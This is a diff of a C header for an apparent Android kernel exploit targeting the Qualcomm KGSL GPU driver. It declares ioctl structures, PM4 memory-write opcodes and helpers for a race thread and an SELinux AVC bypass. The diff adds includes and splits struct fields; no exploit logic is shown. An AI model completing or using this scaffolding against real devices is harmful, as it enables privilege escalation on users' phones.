@@ -1,7 +1,21 @@
 #ifndef AVC_BYPASS_H
 #define AVC_BYPASS_H
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <stdint.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <pthread.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <poll.h>
+#include <dirent.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -27,7 +41,11 @@ struct kgsl_gpuobj_free {
 #define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
 
 struct kgsl_gpuobj_info {
-    uint64_t gpuaddr, flags, size, va_len, va_addr;
+    uint64_t gpuaddr;
+    uint64_t flags;
+    uint64_t size;
+    uint64_t va_len;
+    uint64_t va_addr;
     unsigned int id;
 };
 #define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
@@ -62,17 +80,23 @@ struct kgsl_command_object {
 struct kgsl_gpu_command {
     uint64_t flags;
     uint64_t cmdlist;
-    unsigned int cmdsize, numcmds;
+    unsigned int cmdsize;
+    unsigned int numcmds;
     uint64_t objlist;
-    unsigned int objsize, numobjs;
+    unsigned int objsize;
+    unsigned int numobjs;
     uint64_t synclist;
-    unsigned int syncsize, numsyncs;
-    unsigned int context_id, timestamp;
+    unsigned int syncsize;
+    unsigned int numsyncs;
+    unsigned int context_id;
+    unsigned int timestamp;
 };
 #define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
 
 struct kgsl_cmdstream_readtimestamp_ctxtid {
-    unsigned int context_id, type, timestamp;
+    unsigned int context_id;
+    unsigned int type;
+    unsigned int timestamp;
 };
 #define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
@@ -97,6 +121,9 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 #define SCAN_DWORDS 1024
 #define N_AVC_CHILD 10
 
+#define CP_NOP 0x10
+#define CP_MEM_TO_MEM 0x73
+#define CP_MEM_WRITE 0x3D
 
 extern int kgsl_fd;
 extern volatile int race_done;
@@ -105,7 +132,6 @@ void die(const char *msg);
 void split64(uint64_t addr, uint32_t *lo, uint32_t *hi);
 uint32_t pm4_parity(uint32_t v);
 uint32_t cp_type7(uint32_t opcode, uint32_t cnt);
-
 int gpuobj_alloc(int fd, uint64_t size, uint64_t flags);
 void *gpuobj_mmap(int fd, size_t size, unsigned int id);
 int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr);
@@ -113,11 +139,9 @@ void gpuobj_free(int fd, unsigned int id);
 unsigned int create_context(int fd);
 int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target);
 int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts);
-
 void *race_thread(void *arg);
 void gen_avc_entries(void);
 void dump_avc_page(uint64_t va, uint32_t *d, int n_slots);
-
 int main(int argc, char **argv);
 
-#endif /* CVE33107_AVC_BYPASS_H */
+#endif
